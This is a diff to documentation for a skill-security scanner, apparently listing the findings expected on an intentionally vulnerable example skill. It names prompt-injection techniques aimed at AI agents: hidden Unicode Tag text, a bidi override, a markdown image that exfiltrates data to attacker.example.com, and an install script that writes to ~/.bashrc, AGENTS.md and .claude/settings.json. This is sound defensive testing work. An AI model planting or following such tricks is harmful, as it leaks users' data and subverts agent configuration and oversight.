@@ -9,7 +9,7 @@ When `pruner scan examples/vulnerable-skill --without-cisco` runs, the Coroboros
 | FC004 | `SKILL.md` | `metadata.version` present (Coroboros house rule forbids it). |
 | FC005 | `SKILL.md` | `license: "Apache 2"` is not a valid SPDX identifier (correct: `Apache-2.0`). |
 | PI-UNI-001 | `SKILL.md` | Hidden Unicode Tag block following `Hello`. |
-| PI-UNI-003 | `SKILL.md` | Bidi override `‮` inside the bidi-override section. |
+| PI-UNI-003 | `SKILL.md` | Bidi override (U+202E) inside the bidi-override section. |
 | PI-MDIMG-001 | `SKILL.md` | `![pixel](https://attacker.example.com/?data=X)` — markdown image with query string. |
 | PI-IDFILE-001 | `scripts/install.sh` | `>> ~/.bashrc`, `>> AGENTS.md`, `cp ... .claude/settings.json`. |
 | PI-PEP723-001 | `scripts/setup.py` | PEP-723 block with `dependencies = ["requests", "rich"]` — neither pinned. |
